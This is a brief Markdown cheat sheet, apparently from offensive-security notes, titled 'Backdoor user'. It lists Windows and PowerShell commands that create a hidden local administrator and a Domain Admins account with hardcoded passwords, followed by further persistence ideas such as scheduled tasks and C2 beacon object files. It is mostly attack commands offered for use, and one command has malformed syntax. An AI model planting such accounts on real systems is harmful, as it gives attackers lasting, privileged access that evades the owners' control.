# Backdoor user
### Create a  Local admin user:
1. add user  
```
net user /add:vipa0z Password123!
```
2. make the user member of domain admins/ local 'Administrators'
```
net localgroup Administrators /add:vipa0z
```
### AD Specific
### Create a domain admin

on the DC:
```
New-ADUser -Name "vipa0z" -AccountPassword (ConvertTo-SecureString "Reksio333" -AsPlainText -Force) -Enabled $true

Add-ADGroupMember -Identity "Domain Admins" -Members "vipa0z"
```

---
### other techniques i noted down 
3. scheduled tasks/startup scripts, batch files...etc
4. C2 BOFs (TBA)